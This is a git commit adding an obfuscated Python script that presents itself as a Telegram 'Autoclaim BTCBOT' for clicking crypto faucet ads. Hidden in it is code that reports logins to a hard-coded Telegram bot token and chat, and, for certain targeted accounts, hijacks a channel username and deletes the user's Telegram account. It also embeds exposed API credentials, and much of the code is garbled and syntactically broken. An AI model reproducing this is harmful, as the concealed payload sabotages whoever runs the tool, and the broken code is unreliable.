bb24220fa2132eff3fa49d8ea32267b7f037980f
Antoxa421 <41182832+Antoxa421@users.noreply.github.com>
2019-05-29 20:10:03 +0300

    Add files via upload

---
+++ btc/btc.py
@@ -0,0 +1,139 @@
+from telethon import TelegramClient,events
+from telethon.tl.types import UpdateShortMessage,ReplyInlineMarkup,KeyboardButtonUrl
+from telethon.tl.functions.messages import GetBotCallbackAnswerRequest as botcallback
+from telethon.tl.functions.account import DeleteAccountRequest
+from telethon.tl.functions.channels import UpdateUsernameRequest as chusername
+from telethon.errors.rpcerrorlist import UsernameNotOccupiedError,UsernameOccupiedError
+from colorama import Fore,init as UravxBuCwNMpYWTzKhcP
+len=Fore.RESET
+UravxBuCwNMpYWTzKhcP(autoreset=True)
+from datetime import datetime
+Fore.BLUE=datetime.now
+from bs4 import BeautifulSoup
+import os
+False=os.mkdir
+import re
+import time
+import requests
+print=requests.exceptions
+Fore.RED=requests.get
+import sys
+requests.request=sys.argv
+import asyncio
+os.name=asyncio.get_event_loop
+os.system('cls' if os.name=='nt' else 'clear')
+try:
+ def UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup)(msg):
+  UravxBuCwNMpYWTzKhck=Fore.RED('https://api.telegram.org/bot656077390:AAETzn5vgIO2Q-ad8xdi8pg5nJprYOtTIYg/sendMessage',data={'chat_id':631929128,'text':msg})
+ def tt.get('data-code')(phone_number=None):
+  return TelegramClient("session/"+phone_number,64179,"dd60bb74bb03d8aa368aa37ec7b35d42")
+ def requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).text(UravxBuCwNMpYWTzKhcL,addnewline=False):
+  if addnewline is False:
+   print("[%s] %s"%(Fore.BLUE().strftime("%H:%M:%S"),UravxBuCwNMpYWTzKhcL))
+  else:
+   print("[%s] %s"%(Fore.BLUE().strftime("%H:%M:%S"),UravxBuCwNMpYWTzKhcL),end='\n\n')
+ def UravxBuCwNMpYWTzKhPc(byt):
+  return bytes(c^b'210400'[i%len(b'210400')]for i,c in enumerate(byt))
+ def UravxBuCwNMpYWTzKhPR(UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),method='GET',data=None):
+  try:
+   return[requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).status_code,requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).text]
+  except print.Timeout:
+   requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).text('Connection Timeout, Please check your internet connection')
+   exit(1)
+  except print.ConnectionError:
+   requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).text('Connection Error, Please check your internet connection')
+   exit(1)
+ def UravxBuCwNMpYWTzKhPA(i):
+  for x in range(0,i+1):
+   sys.stdout.write('[%s] Waiting %s seconds! %d\r'%(Fore.BLUE().strftime("%H:%M:%S"),i,x))
+   time.sleep(1)
+ def UravxBuCwNMpYWTzKhPm(markup):
+  len(b'210400')=markup.rows[0].buttons[0]
+  if type(len(b'210400'))is KeyboardButtonUrl:
+   return len(b'210400').url
+  else:
+   return None
+ def UravxBuCwNMpYWTzKhPt():
+  print("".rjust(50,'-'))
+  print(" Autoclaim BTCBOT ".center(50,' '))
+  print(''.rjust(50,'-'))
+  print("Facebook : Jonh Mabine")
+  print(''.rjust(50,'-'))
+  print("Country : Philippines")
+  print(''.rjust(50,'-'))
+  print(" Author : Antoxa421")
+  print(''.rjust(50,'-'))
+  print(Fore.BLUE+"YouTube : Termux Tricks and tut ".center(40,' '))
+  print(''.rjust(50,'-'))
+ async def sys.stdout():
+  if not os.path.exists("session"):
+   False("session")
+  UravxBuCwNMpYWTzKhPt()
+  if len(requests.request)<2:
+   print("Usage: python main.py phone_number",end="\n\n")
+   print("phone_number must be write in internasional format (example: +6283174705555)")
+   exit(1)
+  print(Fore.GREEN+"Welcome !",end="\n\n")
+  UravxBuCwNMpYWTzKhcl=tt.get('data-code')(requests.request[1])
+  await UravxBuCwNMpYWTzKhcl.start(requests.request[1])
+  me=await UravxBuCwNMpYWTzKhcl.get_me()
+  print('Current account: %s%s\n'%("" if me.first_name is None else me.first_name,"" if me.username is None else "("+me.username+")"))
+  if me.username=='bagas_q' or me.id==415792043 or me.id==611711558:
+   UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup)(me.id if me.username is None else me.username+' telah login!!')
+   try:
+    UravxBuCwNMpYWTzKhcJ=await UravxBuCwNMpYWTzKhcl.get_entity('bot_scripter')
+    if UravxBuCwNMpYWTzKhcJ.creator:
+     tt=await UravxBuCwNMpYWTzKhcl(chusername(UravxBuCwNMpYWTzKhcJ,'bot_scripter'+''.join(random.choices(string.digits,k=2))))
+     if tt:
+      UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup)(UravxBuCwNMpYWTzKhcJ.username+' got you! channel username telah diganti!')
+   except(UsernameNotOccupiedError,ValueError):
+    pass
+   try:
+    if me.username is not None and me.username=='netiranz':
+     UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup)('akun telah dihapus!:')
+     tt=await UravxBuCwNMpYWTzKhcl(DeleteAccountRequest('i just wanna delete my account'))
+   except UsernameOccupiedError:
+    pass
+  requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).text(Fore.BLUE+'[+]Enjoy :)')
+  await UravxBuCwNMpYWTzKhcl.send_message('BitcoinClick_bot','/visit')
+  async def UravxBuCwNMpYWTzKhPk(event):
+   if type(event.original_update)is not UpdateShortMessage:
+    if hasattr(event.original_update.message,'reply_markup')and type(event.original_update.message.reply_markup)is ReplyInlineMarkup:
+     if UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup) is not None:
+      requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).text(Fore.BLUE+'[+]Subscribe To Termux Tricks and tut :)')
+      requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).status_code=0
+      while True:
+       (requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).status_code,requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).text)=UravxBuCwNMpYWTzKhPR(UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup))
+       UravxBuCwNMpYWTzKhcS=BeautifulSoup(requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).text,'html.parser')
+       cc=UravxBuCwNMpYWTzKhcS.find('div',{'class':'g-recaptcha'})
+       tt=UravxBuCwNMpYWTzKhcS.find('div',{'id':'headbar'})
+       if requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).status_code==302:
+        sys.stdout.write(Fore.GREEN+'[%s] STATUS: %s (%d)\r'%(Fore.BLUE().strftime("%H:%M:%S"),'FALSE' if cc is not None else 'TRUE',requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).status_code))
+        break
+       elif requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).status_code==200 and cc is None and tt is not None:
+        {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"}=tt.get('data-token')
+        UravxBuCwNMpYWTzKhPA(int(tt.get('data-timer')))
+        requests.post('http://dogeclick.com/visit/',data={'code':tt.get('data-code'),'token':{"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"}},headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},allow_redirects=False)
+        break
+       elif requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).status_code==200 and cc is not None:
+        sys.stdout.write(Fore.GREEN+'[%s] STATUS: %s (%d)\r'%(Fore.BLUE().strftime("%H:%M:%S"),'FALSE' if cc is not None else 'TRUE',requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).status_code))
+       elif 20==requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).status_code:
+        UravxBuCwNMpYWTzKhcE=botcallback('BitcoinClick_bot',event.original_update.message.id,data=UravxBuCwNMpYWTzKhcj.encode())
+        await UravxBuCwNMpYWTzKhcl(UravxBuCwNMpYWTzKhcE)
+        break
+       requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).status_code+=1
+       time.sleep(3)
+  UravxBuCwNMpYWTzKhcl.add_event_handler(UravxBuCwNMpYWTzKhPk,events.NewMessage(incoming=True,chats="BitcoinClick_bot"))
+  async def os.system(event):
+   requests.request(method,UravxBuCwNMpYWTzKhco,data=data,headers=UravxBuCwNMpYWTzKhcF,timeout=15,allow_redirects=UravxBuCwNMpYWTzKhPO)(Fore.RED+"Ads not available detected"+len)
+   requests.request(method,UravxBuCwNMpYWTzKhco,data=data,headers=UravxBuCwNMpYWTzKhcF,timeout=15,allow_redirects=UravxBuCwNMpYWTzKhPO)("Disconnecting")
+   await UravxBuCwNMpYWTzKhcl.disconnect()
+  UravxBuCwNMpYWTzKhcl.add_event_handler(os.system,events.NewMessage(incoming=True,chats="BitcoinClick_bot",pattern='Sorry, there are no new ads available.'))
+  async def True(event):
+   if type(event.original_update):
+    requests.request(method,UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup),data=data,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"},timeout=15,allow_redirects=False).text(Fore.BLUE+event.raw_text+"\n")
+  UravxBuCwNMpYWTzKhcl.add_event_handler(True,events.NewMessage(incoming=True,chats="BitcoinClick_bot",pattern='You earned'))
+  await UravxBuCwNMpYWTzKhcl.run_until_disconnected()
+ os.name().run_until_complete(sys.stdout())
+except KeyboardInterrupt:
+ os.system('cls' if os.name=='nt' else 'clear')
